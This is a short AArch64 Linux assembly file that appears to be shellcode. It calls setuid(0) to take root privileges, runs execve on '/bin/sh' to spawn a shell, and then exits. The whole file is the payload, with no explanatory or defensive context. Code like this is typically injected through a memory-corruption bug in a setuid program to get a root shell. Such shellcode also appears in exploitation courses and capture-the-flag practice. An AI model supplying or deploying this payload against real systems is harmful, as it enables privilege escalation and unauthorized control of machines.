.section .text
.global _start
_start:
	mov x0, #0
	mov x8, #146 /* setuid 0 */
	svc #0
	adr x0, shell
	mov  x1, xzr
	mov  x2, xzr
	mov x8, #221 /* execve "/bin/sh/" NULL NULL */
	svc #0
	mov x0, xzr
	mov x8, #93 /* exit 0 */
	svc #0

.section .data
shell: .asciz "/bin/sh"
